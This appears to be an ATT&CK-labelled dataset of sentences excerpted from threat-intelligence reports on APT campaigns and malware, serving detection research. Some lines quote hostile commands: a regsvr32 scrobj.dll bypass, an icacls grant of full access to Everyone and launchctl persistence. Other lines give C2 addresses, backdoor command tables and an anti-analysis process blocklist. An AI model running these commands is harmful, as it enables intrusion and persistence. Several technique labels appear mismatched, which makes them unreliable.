The current version, HawkEye Reborn v9 has been modified from earlier versions and heavily obfuscated to make analysis more difficult.The email campaigns that have been observed feature characteristics that are consistent with what is commonly seen with malspam campaigns, with the emails purporting to be associated with various documents such as invoices, bills of materials, order confirmations, and other corporate functions	['T1027']
The AutoIT script is offering a lot of other functions which are not used in this campaign, like anti-virtual machine detection, USB drive infection and others.The final payload — which we found in the AutoIT PE file resource section and was started by the process-hollowing shellcode — is a .NET PE file that's obfuscated with ConfuserEx	['T1027']
All strings below are encrypted via AES256 and base64 encoding	['T1027']
Embedded Trojan This Trojan loaded by the first payload contains several embedded executables that it uses to ultimately download and execute a secondary payload, as well as downloading and opening a decoy document	['T1027']
Figure 3 shows this webshell’s code that will run supplied JScript provided in base64 encoded format within the URL within a parameter	['T1027']
Figure 6: Assembly view of Sample 3 root installation related byte arrays As it turns out, the referenced byte mask is applied to the other byte arrays using a rolling double-XOR algorithm to construct malware installation paths, filenames, and descriptions for a Linux root account	['T1573']
It also gathers network information such as the MAC address, IP address, WINS, DHCP server, and gateway	['T1016']
If Adobe Flash or Microsoft Silverlight is no longer required, DHS recommends that those applications be removed from systems.The IOCs provided with this alert include IP addresses determined to be part of the HIDDEN COBRA botnet infrastructure, identified as DeltaCharlie	['T1016']
The Retriever Trojan uses the following namespace: using pcchekapp.grp.ammar.samaneh; Android.The malware begins by creating a web service object and uses the following URL within its configuration: http:// service.chrome-up[.]date:8080 /WebService.asmx It then calls a function called “SetLog2”, which sets variables for the system’s IP address, MAC address and hostname	['T1016']
The public IP is then POSTed along with OS Version, Internal IP, Machine Name, Domain Name, UserName after being encrypted to the previously chosen URL to register a new victim	['T1016']
The email address is associated with the Lebanese domain of a major global financial institution	['T1016']
Examining passive DNS (pDNS) records from PassiveTotal revealed several domain names associated with this IP that mimic popular technology companies	['T1016']
The code will gather the information and format the list using the following HTML to create a table: <table> <tr><td>Type</td><td>Owner</td><td>Permissions</td><td>Created</td><td>Modificated</td><td>Size</td><td>Path</td></tr> <tr><td>[fileType]</td><td>[fileOwnerAccountName]</td><td>[number filePosixPermissions]</td><td>[fileCreationDate]</td><td>[fileModificationDate]</td><td>[fileSize]</td><td>[file path?]</td></tr> … </table>    Table 1 Commands available within XAgent OSX The ‘showBackupIosFolder’ command is rather interesting, as it allows the threat actors to determine if a compromised system was used to backup an IOS device, such as an iPhone or iPad	['T1016']
APT40 relies heavily on web shells for an initial foothold into an organization	['T1505.003']
The MPK IRC Bot monitors active application windows and writes the title of the open window along with the logged keystrokes to a file at “%temp%\Save.tmp”	['T1010']
Destroy Evidence: Securely deleted logs, as well as deployed and executed disk-wiping malware, to cover tracks and disrupt forensic analysis	['T1070.004']
In the event it does, Reaver will move this file to ‘%TEMP%\~FJIOW.tmp’ and delete this new file	['T1070.004']
Size Expansion of Configuration Information PlugX is designed to run based on its configuration information stored in itself	['T1082']
System owners are also advised to run the YARA tool on any system they suspect to have been targeted by HIDDEN COBRA actors	['T1082']
Cadelspy initially arrives on the computer as a dropper, which downloads two installer components catering to whether the victim is running a 32-bit or 64-bit system	['T1082']
"You can see that in addition to the code, the author copy-pasted English typos such as ""IE Registery"":PDB PathsWe can clearly identify a pattern in the PDB naming convention of all the binaries mentioned in this article.ROKRAT:e:\Happy\Work\Source\version 12\T+M\Result\DocPrint.pdb (from the ""Evil New Year"" campaign)d:\HighSchool\version 13\2ndBD\T+M\T+M\Result\DocPrint.pdb (from the ""North Korean Human Rights"" campaignD:\HighSchool\version 13\First-Dragon(VS2015)\Sample\Release\DogCall.pdb (ROKRAT Sample from an unidentified campaign from June)Wiper:D:\HighSchool\version 13\VC2008(Version15)\T+M\T+M\TMProject\Release\ErasePartition.pdb (From the ""Are You Happy?"" campaign)Summary GraphHere is a graph to visualize the similarities and differences between each campaign mentioned in this article:ConclusionSouth Korea is becoming an important target for malicious actors and the techniques used are becoming specific to the region (for example: use of native language to try and ensure the targets feel that the information, document or email being sent to them has added legitimacy)"	['T1082']
Parameter   Description    ‘u=’  This parameter contains target machine information in the following format: <Computer Name>, <User Name>, <Windows Versions>, <Processor Architecture>, <1.3>, < KdfrJKN >, <Volume Serial Number>    ‘&h=’  This parameter includes the information about the command executed and its results	['T1082']
The rest of MirageFox functions similarly to previous malware created by APT15, first collecting information about the computer like the username, CPU information, architecture, and so forth	['T1082']
The HandlePP::getClientID method uses the following environment variables:   Figure 11. Serial number   Figure 12. Hardware UUID   Figure 13. MAC address   Figure 14. Randomly generated UUID For the initial information packet, the backdoor also collects the following:   Figure 15. OS version Running getpwuid ->pw_name , scutil – -get ComputerName, and uname –m will provide the following returns respectively:  Mac OSX 10.12	['T1082']
Additional information For more information about the attacks and the indicators of compromise, please contact: intelreports@kaspersky.com Alternatively, please visit: https://www.kaspersky.com/enterprise-security/apt-intelligence-reporting To find more information about cybersecurity awareness training for enterprise or government staff, go to Kaspersky Security Awareness	['T1082']
Is this a Windows-only threat? Which versions of Windows are targeted? Poseidon is particularly focused on the Microsoft Windows operating system family, specifically customizing the infection method for each one so as to gather different information and hide its presence after the initial infection	['T1082']
URL parameter Sample data Description   c= Victim->Administrator Hostname and username   l= 192.168.1.100 Compromised system's IP address   o= 5,1,1,32 Windows major and minor version, coupled with architecture (32 v	['T1082']
The PE compile time of loaders and the create time of droppers (Word documents) are plotted in the graph	['T1124']
Alarmingly, the detection score on VirusTotal for all of the documents continues to be 0/56 from the time the first documents were uploaded (1.6.2017) up until the date of this publication	['T1124']
The times of day that APT33 threat actors were active suggests that they were operating in a time zone close to 04:30 hours ahead of Coordinated Universal Time (UTC)	['T1124']
The last technique that was particularly interesting is the time zone check, as the Trojan will not execute its functional code if the system does not have a specific time zone set	['T1124']
Figure 2: Exploit Shellcode used to Locate and Decode Payload The shellcode (Figure 2) searches for and decodes the executable payload contained in memory between the beginning and ending file markers 0xBABABABA and 0xBBBBBBBB, respectively	['T1140']
Comnie continues to load an embedded bitmap (BMP) file and decrypt data at offset 0x512	['T1140']
The subdomain 676f6f646c75636b is a hex encoded string which decodes to goodluck	['T1140']
The final antidebugging technique involves GetTickCount performance counters, which are placed within the main sections of code to detect any delay a debugger adds during runtime	['T1140']
Even if the arsenal of this actor is diverse, we have identified some patterns, copy-paste code from various public repositories and similarities between the different piece of code	['T1140']
The MirageFox binaries export a function called dll_wWinMain, the name of an export in vsodscpl.dll, a module by McAfee that is loaded by a few of their executables that import and call this function	['T1140']
The malware proceeds to decrypt and embedded configuration of 128 bytes using a simple XOR routine	['T1140']
The payload then uses the MD5 hash (14331d289e737093994395d3fc412afc) of what appears to be a hardcoded SHA1 hash (B6A75B1EF701710D7AEADE0FE93DE8477F3BD506) as an RC4 key to decrypts the resulting decoded data	['T1140']
No pdb/debug strings are present in the code	['T1140']
Malicious document used by Tropic Trooper PDB Strings as Context Clues The MSI file has two program database (PDB) strings inside: one belonging to the MSI file, and another for the backdoor installer (detected by Trend Micro as TROJ_TCDROP.ZTFB)	['T1140']
Snapshot of code we used to decrypt TClient’s configuration   Figure 11	['T1140']
This effectively routes SOGU malware traffic through the victim’s service provider, which likely indicates a foothold on the service provider’s network	['T1543', 'T1543.003']
BootComplete starts the AutoStartup service and the AutoStartup service makes sure that MainActivity is always running	['T1543', 'T1543.003']
The executable attempts to download a couple of files from different sources and saves them in the AppData and Startup folders for persistence, then invokes the first downloaded file – Picture2.exe	['T1105']
It exploits CVE-2017-0199 to download the second stage payload from 193.23.181.151 (Figure 3)	['T1105']
Zyklon is a publicly available, full-featured backdoor capable of keylogging, password harvesting, downloading and executing additional plugins, conducting distributed denial-of-service (DDoS) attacks, and self-updating and self-removal	['T1105']
Figure 4: Embedded URL in OLE object    Figure 5: HTTP GET request to download the next level payload The downloaded file, doc.doc, is XML-based and contains a PowerShell command (shown in Figure 6) that subsequently downloads the binary Pause.ps1	['T1105']
Figure 8: Network communication to download the Pause.ps1 payload Zyklon Delivery In all these techniques, the same domain is used to download the next level payload (Pause.ps1), which is another PowerShell script that is Base64 encoded (as seen in Figure 8)	['T1105']
As shown in Figure 12, the script within the dupatechecker.doc file attempts to download another file named dupatechecker.exe from the same server	['T1105']
Most of them manipulate the machine to download and execute different files	['T1105']
A backdoor that communicates with a single command and control (C2) server using HTTP GET and POST requests, TONEDEAF supports collecting system information, uploading and downloading of files, and arbitrary shell command execution.	['T1105']
SNUGRIDE is a backdoor that communicates with its C2 server through HTTP requests	['T1071']
Pseudo-HTTP Protocol Messages for the pseudo-HTTP protocol are delimited with the ‘|’ character	['T1071']
After Comnie collects the remote C2 information, it will communicate with these remote servers using HTTP requests	['T1071']
If you compare the HTTP GET request from the RIPTIDE samples (Figure 1) to the HTTP GET request from the HIGHTIDE samples (Figure 3) you can see the malware author changed the following items:  User Agent Format and structure of the HTTP Uniform Resource Identifier (URI)   Figure 3: HIGHTIDE GET Request Example Similar to RIPTIDE campaigns, APT12 infects target systems with HIGHTIDE using a Microsoft Word (.doc) document that exploits CVE-2012-0158	['T1071']
Figure 9: Command logs after execution Network Communications FELIXROOT communicates with its C2 via HTTP and HTTPS POST protocols	['T1071']
The following shows the specific IP addresses or strings used by the C2 to transmit a success or cancel message depending on the type of DNS query used for C2 communications:    DNS Type Successful Cancel   A,AC 1.1.1.\d+ 1.2.9.\d+   AAAA 2a00:: 2200::   CNAME,MX,TXT,SRV,SOA ok cancel    After providing system specific information, the payload will Interact with the C2 server to obtain commands, which the payload refers to as jobs	['T1071']
It does so using either the HTTPS/HTTP or DNS channels, depending on which method is successful	['T1071']
Finally, the first DLL adds the registry key “SysRat,” at SoftWare\Microsoft\Windows\CurrentVersion\Run, to ensure the malware is executed at startup	['T1547.001']
APT10 spear phishes have been relatively unsophisticated, leveraging .lnk files within archives, files with double extensions (e.g	['T1547.009']
The .lnk file extracted from the .7zip file	['T1547.009']
The script saves the decoded and decompressed executable to %APPDATA%\Microsoft\Windows\Templates\WindowsTemplate.exe and creates an LNK shortcut at %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\OneDrive.lnk to persistently run WindowsTemplate.exe each time Windows starts up	['T1547.009']
If this file exists, the content is read in order to obtain a path to find a second file with the LNK (link) extension	['T1547.009']
When it is executed, it creates two files: an LNK file that points to %system32%\rundll32.exe, and the FELIXROOT loader component	['T1547.009']
In this campaign the KopiLuwak backdoor was encoded and delivered in a Windows shortcut (.lnk) file	['T1547.009']
When the Trojan runs as an executable within the “DsvHelper” folder, the Trojan will create a shortcut (.lnk file) and save the shortcut to the ‘DsvHelper’ folder	['T1547.009']
The tactic also serves to mask malicious C2 and exfiltration traffic and make it appear innocuous	['T1132']
The encoded payload is then made to look like a URI by having a random number of ‘/’ characters inserted at random locations within the encoded payload	['T1132']
McAfee ATR has now discovered additional implants that are part of an operation to gain persistence for continued data exfiltration and for targeted access	['T1132']
The DropIt Trojan we analyzed is an executable that builds an embedded executable by decoding embedded blobs of base64 encoded data and concatenating them together in the correct order	['T1132']
Initial Compromise For initial compromise, FireEye Intelligence has observed APT39 leverage spear phishing emails with malicious attachments and/or hyperlinks typically resulting in a POWBAT infection	['T1598.002']
In order to meet the phishing emails’ infrastructure requirements, disposable domains and emails were used as the delivery medium	['T1598.002']
Initial Attack On December 13, 2017, a spear phishing email was sent from the email address of yuri.sidorav@yandex[.]ru to a high ranking individual within a British government agency	['T1598.002']
Traps blocks all of the files currently associated with Gorgon Group    Appendix   Analysis of a targeted attack “1971 Liberation War Freedom Fighters in Pakistan ArmyCustody Database98” The delivery documents used in the targeted attacks are Microsoft Office documents that contain a macro that attempts to compromise the system	['T1598.002']
The victim will then see a prompt to Enable Content as with any malicious macro document as seen in Figure 5	['T1204']
Figure 5 Remote template document requesting the user to click “Enable Content” to run macro Clustering The delivery documents used in the October and November waves shared a large number of similarities, as seen in Table 1, which allowed us to cluster the activity together	['T1204']
In one example, the Word document contained a button with the label “First click “Enable Content” above the page, then click here to fill out the form”  This string attempts to trick the user into enabling macros to execute the malicious code within the macro	['T1204']
Malicious Macro Analysis When the victim opens the ThreeDollars document they are presented with the lure image and prompted to click on the “Enable Content” button	['T1204']
Figure 9: Example of callback Earlier versions of UPPERCUT used the hard-coded string “this is the encrypt key” for Blowfish encryption when communicating with a C2	['T1573']
A 256-bit AES session key is generated and used to encrypt both message headers and bodies separately	['T1573']
It has historically leveraged legitimate third-party websites to host the malware’s command and control (C2) information, acting as “dead drops”	['T1102']
The group also used GitHub as a repository for tools that it downloaded post-compromise.	['T1102']
The Trojan checks to see if the result of this query returned a class with more than 0 elements, which would most likely be true in a non-virtual environment	['T1018']
The primary difference was that this sample was encrypted and password protected, requiring the victim to enter in a password which was likely provided by the adversary to view the document	['T1018']
(Source: Dell SecureWorks) Over a few days' span, the threat actors install remote access tools on additional systems based upon the results of the network reconnaissance	['T1018']
NetPass is a free network password recovery tool that, according to its developer Nirsoft, can recover passwords including:  Login passwords of remote computers on LAN	['T1003']
It should be noted that the Win32/KillDisk.NBB variant used against media companies is more focused on destroying various types of files and documents	['T1083']
Included in the directories were a combination of files leveraged in targeted attacks mentioned above against nation states	['T1083']
17 Complete List of Malware Files  Fig	['T1083']
Some lure documents used in these attacks are shown below: Decoy documents used in BlackOasis attacks To summarize, we have seen BlackOasis utilizing at least five zero days since June 2015:  CVE-2015-5119 – June 2015 CVE-2016-0984 – June 2015 CVE-2016-4117 – May 2016 CVE-2017-8759 – Sept 2017 CVE-2017-11292 – Oct 2017  Attacks Leveraging CVE-2017-11292 The attack begins with the delivery of an Office document, presumably in this instance via e-mail.  Embedded within the document is an ActiveX object which contains the Flash exploit	['T1203']
Leveraging data from Kaspersky Security Network, we identified two other similar exploit chains used by BlackOasis in June 2015 which were zero days at the time.  Those include CVE-2015-5119 and CVE-2016-0984, which were patched in July 2015 and February 2016 respectively.  These exploit chains also delivered FinSpy installation packages	['T1068']
Deploying a multi-layered approach including access policies, anti-virus, network monitoring and whitelisting can help ensure customers are protected against threats such as this.  Users of Kaspersky products are protected as well against this threat by one of the following detections:  PDM:Exploit.Win32.Generic HEUR:Exploit.SWF.Generic HEUR:Exploit.MSOffice.Generic  More information about BlackOasis APT is available to customers of Kaspersky Intelligence Reporting Service	['T1068']
These vulnerabilities were patched last December 28 2015, April 5, 2016, and May 12, 2016, respectively	['T1068']
Trend Micro Solutions Trend Micro™ Deep Security™ and Vulnerability Protection provide virtual patching that protects endpoints from threats such as malicious redirections to malware-hosting URLs, as well as those that exploit unpatched vulnerabilities	['T1068']
exploits a known Windows privilege escalation vulnerability ( ) on unpatched computers.	['T1068']
Detecting Avast  A unique feature of this latest Astaroth Trojan campaign is the malware's ability to search for specific security products and exploit them	['T1518.001']
Checks for the presence of security tools (detailed in the Appendix) and if any of these security tools are discovered, then the system will be shut down, as shown in Figure 14	['T1518.001']
APT38 is characterized by long planning, extended periods of access to compromised victim environments preceding any attempts to steal money, fluency across mixed operating system environments, the use of custom developed tools, and a constant effort to thwart investigations capped with a willingness to completely destroy compromised machines afterwards	['T1005']
Following the compromise of this system, analysts identified FIN6 leveraged stolen credentials to move laterally within the environment using the Windows’ Remote Desktop Protocol (RDP).	['T1021.001']
FIN6 also moved laterally to servers in the environment using RDP and configured them as malware “distribution” servers.	['T1021.001']
Each of the emails had a password protected RAR archive attached named credential.rar	['T1560']
Msoffice365cdn[.]com resolves to 80.82.79.221, which resides on the same class C network range as the IP resolution of office365-technical[.]info, which resolves to 80.82.79.240	['T1571', 'T1043']
SpyNote RAT builder The SpyNote Remote Access Trojan (RAT) builder is gaining popularity in the hacking community, so we decided to study its pervasiveness	['T1571', 'T1043']
On execution, the tool injects itself into lsass.exe and is triggered with the argument “dig”	['T1055']
This utility is able to execute complicated WQL queries and WMI methods	['T1047']
POSHSPY's use of WMI to both store and persist the backdoor code makes it nearly invisible to anyone not familiar with the intricacies of WMI	['T1047']
WMI permanent event subscriptions can be used to trigger actions when specified conditions are met	['T1047']
Initial triage begins with connecting to Windows Management Instrumentation (WMI) via the “ROOT\CIMV2” namespace	['T1047']
Most of the PowerShell commands would call Windows Management Instrumentation (WMI)	['T1047']
If this function is successfully loaded, it will ultimately spawn a new instance of itself with the Rundll32Call export via a call to rundll32.exe	['T1218.011']
The function then uses the built-in Shell function to run the following command, which effectively executes the .sct file stored in 12-B-366.txt:       regsvr32.exe /s /n /u /i:%TEMP%\12-B-366.txt scrobj.dll     The use of the legitimate regsvr32.exe application to run a .sct file is an AppLocker bypass technique originally discovered by Casey Smith (@subtee), which eventually resulted in a Metasploit module	['T1218.010']
Those assignments were not likely arbitrary, as this group had developed BlackEnergy2 for several years in a professional and organized style:  Config with a similar set of plugins for different architectures Here is the list of retrieved files and related functionality:    weap DDoS Attack (various types)   ps password stealer handling a variety of network protocols (SMTP, POP3, IMAP, HTTP, FTP, Telnet)   nm scans ports, stores banners   snif logs IP source and destination, TCP/UDP ports   hook main module: CnC communication, config parser, plugins loader   uper rewrites hook module with a new version and launches it     Weap, Snif, Nm plugin grammar mistakes and mis-spellings The developers’ coding style differed across the ‘Hook’ main module, the plugins, and the Windows main.dll	['T1046']
For example, APT32 installed one backdoor as a persistent service with a legitimate service name that had a Unicode no-break space character appended to it	['T1036']
SHA256 Filename PowerShell Filename Variant   5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63 <redacted> Technical Services.exe Office365DCOMCheck.ps1 Bat2exe   d948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520 tafahom.exe, Sales Modification.exe SystemDiskClean.ps1 .NET    Table 1	['T1036']
Filename  vsrss.exe    File Size  446976 bytes    MD5  5c3456d5932544b779fe814133344fdb    SHA1  7ab750afb25457a81c27a98dc6dfd51c27e61b0e    Notes Delphi RAT file that beacons to ebeijingcn.live	['T1036']
It named Meterpreter as a WAV file type, probably in the hope that this would not raise suspicions	['T1036']
The Glimpse panel showing three compromised systems To interact with a specific agent, the actor selects the entry to open in the agent control panel	['T1543.001']
Property list with persistence settings launchctl load /Library/LaunchDaemons/filename.plist > /dev/nul or launchctl load ~/Library/LaunchAgents/ filename.plist > /dev/nul will then command the operating system to start the dropped backdoor file at login	['T1543.001']
From the 185.25.50[.]93 C2 IP, we discovered another hard-coded user agent being used by Zebrocy: Mozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.3.8 (WinHTTP/5.1) like Gecko We observed several samples of Zebrocy using this user agent targeting the foreign affairs ministry of a large Central Asian nation	['T1543.001']
If the Trojan does not have root privileges to enable its automatic launch, it creates the “~/.config/autostart/dbus-inotifier.desktop” file with the following contents: [Desktop Entry] Type=Application Exec=/home/user/.config/dbus-notifier/dbus-inotifier Name[en_EN]=system service d-bus notifier Name=system service d-bus notifier Comment[en_EN]= Comment= “/home/user/” stands here for the environment variable HOME	['T1033']
PDB strings containing the 'SyberSpace' username	['T1033']
bat: A batch file to set up the service COMSysApp, for an x64 system bat: A batch file to set up the service COMSysApp, for an x86 system ini: A data file with Base64-encoded data for connecting to an FTP server	['T1059', 'T1064']
So this method uses psexec itself to copy the payload over the network, overwrite earlier versions (if found), and run it without waiting for any response. They use batch files that leverage psexec , again, to push PowerShell loader scripts out to machines the network scanner finds on the internal network.	['T1059', 'T1064']
Screenshots The data dump includes several screenshots of resources that the leaker alleged was related to the OilRig group	['T1113']
Periodic low resolution screenshots	['T1113']
LONGWATCH is a keylogger that outputs keystrokes to a log.txt file in the Window’s temp folder.	['T1056']
DLL side loading has been used to maintain persistence on the compromised system	['T1574.002']
As security controls have improved, DLL side loading has evolved to load a payload stored in a different directory or from a registry value	['T1574.002']
With the Trojan moved its final location, it will then create a scheduled task to run a VBScript to make sure it runs persistently	['T1053', 'T1053.005']
This process ultimately attempts to run the Trojan every three minutes, which is important as OopsIE relies on this scheduled task as it does not include a main loop to continue its execution	['T1053', 'T1053.005']
The oldest known sample of the Delphi variant (SHA256: 5a02d4e5f6…) provided us a much stronger linkage between this Delphi Cannon and Cannon, as this sample collects system information and sends it to the C2 email address, which includes the path of the running process appended to the string Running place	['T1057']
“win32_remote“,”win64_remote64“,”ollydbg“,”ProcessHacker“,”tcpview“,”autoruns“,”autorunsc“,”filemon“,”procmon“,”regmon“,”procexp“,”idaq“,”idaq64“,”ImmunityDebugger“,”Wireshark“,”dumpcap“,”HookExplorer“,”ImportREC“,”PETools“,”LordPE“,”dumpcap“,”SysInspector“,”proc_analyzer“,”sysAnalyzer“,”sniff_hit“,”windbg“,”joeboxcontrol“,”joeboxserver“  Blacklisted process names in the malware In some cases, it calculates the checksum of each running process name, and if it matches any hard-coded checksums, it causes a BSOD via the ntdll.dll “NtRaiseHardError” function	['T1057']
One of the documents we examined with the filename Rocket attacks on Israel.docx (SHA256: 34bdb5b364..) contained inconsistent creation and last modified timestamps, with the last modified timestamp occurring before the creation timestamp	['T1070.006']
Create a process by impersonating a logged-on user  Getting a user token using WTSQueryUserToken	['T1134']
ARTIFACTS: Documents:     2781526f6b302da00661b9a6a625a5a6ecf4ffccafa61202e9b0e9b61b657867     c357396ca82fdcd6b6f46b748f2b6941051dbc81be5326cf9548e6e95507af7c     ffebcc4d2e851baecd89bf11103e3c9de86f428fdeaf0f8b33d9ea6f5ef56685     Domains:  true-deals[.]com; strikes-withlucky[.]com Email account in registration is: isvarawski@yahoo.com Attacker email account: adrian.1987clark@yahoo.com	['T1087']
Message 2:    Headers Received: by mailcenter.support   Sender Council on Foreign Relations <webprint@fprii.net>   Subject The Four Traps China May Fall Into   Body Content and images included within the e-mail body were a direct copy of the following CFR article: https://www.cfr.org/blog/four-traps-china-may-fall   Notes Multiple hyperlinks within the e-mail body lead to a malicious RTF document located at the URL  hxxp://fprii.net/The_Four_Traps_for_China.doc	['T1087']
Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network	['T1087']
The shareDll32 module then enumerates and identifies systems connected on the same domain using WNetEnumResource and GetComputerNameW	['T1087']
The VBScript has a SHA256 has of 649e3922ec53d5b195ed23aac08148faeb561f47e891b1e6ff60a2a9df4fea17, which calls two PowerShell commands to download and execute a payload and downloading and opening of a decoy document	['T1546.013', 'T1059.001']
FIN6 used PowerShell to execute an encoded command	['T1546.013', 'T1059.001']
the PowerShell is executed using reflectively loaded ReflectivePicker from the Empire project	['T1546.013', 'T1059.001']
"In this context the main function is executed.""Console"": with the argument, a persistence is configured and the malware will be executed at the next reboot ( HKCU\Software\Microsoft\Windows\CurrentVersion\Run\runsample ).""Sample"": with this argument, the malware executes the console command followed by the help command.The information collected is performed using WMI queries:Additionally the malware lists the running process via the Microsoft Windows API"	['T1106']
The overwritten instruction (displayed in Figure 1) is used to call the “WinExec” function from kernel32.dll, as depicted in the instruction at 00430c12, which calls the “WinExec” function	['T1106']
Registry key “SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System ” is queried to check the values ConsentPromptBehaviorAdmin and PromptOnSecureDesktop	['T1012']
VMware DLL Check The Trojan checks to see if the files vmGuestLib.dll or vmbusres.dll exist in the system directory	['T1497.001', 'T1497']
Ryuk is a ransomware that uses a combination of public and symmetric-key cryptography to encrypt files on the host computer.	['T1486']
A new child process is created as “ tg ​ yt ​ ut ​ rc ​ ( ID) ​ .e ​ xe - i SM- tgytutrc ”, which is used to encrypt a single file on the drive	['T1486']
In order to evade network level detection, the downloader uses steganography.	['T1001']
send a POST response to the C&C server to extract the user’s login credentials. redirect users to fake phishing websites.	['T1185']
icacls . /grant Everyone:F /T /C /Q	['T1222']
COM + hijack in same sentence	['T1546.015']
!Hello The Trojan introduces itself by sending the current username, if its an admin account or not, the computer name, the system UUID and the OS version	['T1033', 'T1082']
19-2 A startup event for persistence The malware will run 2 .dlls from regsvr32 simultaneously, spawning userinit, ctfmon, and svchost processes	['T1218.010', 'T1547.001']
AC,CNAME,MX,TXT,SRV,SOA Uses the regular expression ‘Address:\s+(\d+.\d+.\d+.\d+)’ and uses the decimal value in the first octet of that IPv4 address    Table 1 Breakdown of query types Once the system identifier is obtained, the payload gathers system specific information and sends it to the C2 server	['T1082', 'T1016']
Advanced endpoint threat detection (AETD) can help detect activity associated with web shells and lateral movement, and network technologies that use sandboxing techniques to detonate binaries in network traffic can prevent malicious traffic from reaching internal systems	['T1505.003', 'T1021.002']
Again, a shortcut file is written to the %TEMP% path with a name of ‘~Update.lnk’, which is in turn copied to the identified startup path with a filename of ‘Windows help.lnk’	['T1036', 'T1547.009']
An obfuscated command is located inside the Target bar in the .lnk file properties.   Hidden command inside the .lnk file	['T1070.006', 'T1547.009']
APIs from the following libraries are loaded at runtime:  Kernel32.dll Ws2_32/wsock32.dll Apvapi32.dll Oleaut32.dll Iphlp.dll Urlmon.dll  A dynamic API loaded by the malware	['T1055', 'T1574.001', 'T1574.002']
A second scheduled task named “Scheduled Defrags” was created by loading the raw task XML with a backdated task creation timestamp of June 2, 2016	['T1053.005', 'T1036']
helloworld – performs actions identical to the newer sample’s ‘Sub’ function helloworld1 – accepts command-line arguments, performs a UAC bypass helloworld2 – drops and compiles a mof filemof file   sqmAddTostream – expected to run initially by the malware, checks OS version and loads the malware with helloworld2	['T1573', 'T1027.001', 'T1016', 'T1048', 'T1550.002']
Cache.dll code flow overview RC4 decrypt hardcoded c2 and urls resolve hidden function calls collect identifying victim system data encrypt collected data send stolen data to c2 and retrieve commands Cache.dll code details Structurally, “Cache.dll” is a fairly large backdoor at 425KB	['T1005', 'T1140', 'T1041']
Cache.dll connectback urls: 209.200.83.43/ajax/links.php 209.200.83.43/ajax/api.php 209.200.83.43/ajax/index.php 209.200.83.43/ajax/error.php 209.200.83.43/ajax/profile.php 209.200.83.43/ajax/online.php 209.200.83.43/ajax/loader.php 209.200.83.43/ajax/search.php Observed user-agent string on the wire, but it’s dynamically generated based on the Windows system settings (retrieved using standard win32 api “ObtainUserAgentString”): “User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)” Communications with the CozyDuke C2 include key/value pairs passed as URL parameters	['T1106', 'T1087']
"Command Functionality   A List logical drives   B List directory (Z1 = directory name to list)   C Read data from file (Z1 = filename to read)   D Write content to file (Z1 = filename to write, Z2 = content to write)   E Delete file in directory (Z1 = file)   F Generate custom web response ""->|value in Z1|<-""   G Write hex-encoded content to file (Z1 = filename to write, Z2 = hex encoded content to write)   H Call _Notice(Z1, Z2)   I Move/rename file or directory (Z1 = target, Z2 = new name)   J Create directory (Z1 = directory name)   K Timestomp file or directory (Z1 = target, Z2 = time/date string to stomp to)   L Download file from Internet (Z1 = URL, Z2 = filename to write to)   M Launch process (Z1 = process name, Z2 = arguments)   N Test connect to SQL database (Z1 = SqlConnect String)   O SQL Get database table scheme (Z1 = \r delimited parameters to command)   P SQL Get database table scheme with restrictions (Z1 = \r delimited parameters to command)   Q SQL execute SQL command (Z1 = \r delimited parameters to command)    Table 4"	['T1070.006', 'T1036', 'T1083', 'T1074', 'T1547.001']
Commands   Description    0x97A168D9697D40DD  Download and validate file (XXHash comparison) from C2 server    0x7CF812296CCC68D5  Upload file to C2 server    0x652CB1CEFF1C0A00  Load PE file    0x27595F1F74B55278  Download, validate (XXHash comparison), execute file, and send output to C2 server    0xD290626C85FB1CE3  Format the current timestamp    0x409C7A89CFF0A727  Capture the desktop screenshot in PNG format and send it to C2    None of the above  The received buffer is executed via cmd.exe and the output is then sent to the C2 server    Table 5: Supported commands  Conclusion While APT10 consistently targets the same geolocation and industry, the malware they use is actively evolving	['T1113', 'T1071', 'T1041', 'T1132', 'T1105']
"During our analysis, we observed one loader running “rr.exe” with the following arguments:open cmd.exe /c c:\\temp\\rr.exe SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run ""C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\spp.exe"" iexploreThe “rr.exe” payload dropped to the system does nothing more than use the supplied command line arguments to create a registry key to execute the payload each time the system starts"	['T1055.012', 'T1036']
Executable-Signing Certificates Samples are usually signed with a fake certificate – we’ve seen two instances, one AMD and one Intel:  Configuration files: Some of the malware uses an encrypted configuration file which is stored on disk as “racss.dat”	['T1553.002', 'T1027']
Features  TCP network stream (IPv4 & IPv6 support) Fast network serialization (Protocol Buffers) Compressed (QuickLZ) & Encrypted (TLS) communication Multi-Threaded UPnP Support No-Ip.com Support Visit Website (hidden & visible) Show Messagebox Task Manager File Manager Startup Manager Remote Desktop Remote Shell Download & Execute Upload & Execute System Information Computer Commands (Restart, Shutdown, Standby) Keylogger (Unicode Support) Reverse Proxy (SOCKS5) Password Recovery (Common Browsers and FTP Clients) Registry Editor  Supported runtimes and operating systems  .NET Framework 4.0 Client Profile or higher (Download) Supported operating systems (32- and 64-bit)  Windows XP SP3 Windows Server 2003 Windows Vista Windows Server 2008 Windows 7 Windows Server 2012 Windows 8/8.1 Windows 10    Compiling Open the project in Visual Studio 2017+ and restore the NuGET packages	['T1106', 'T1010', 'T1105', 'T1021.002']
Figure 5 HTTP POST request to obtain an OAUTH access token Figure 5 shows that the Trojan then uses the following regular expression to obtain the access token from the HTTP response: \”access_token\”:(.*) Once authenticated with a valid access token, the Trojan will attempt to upload a file to the Google Drive account	['T1071', 'T1134']
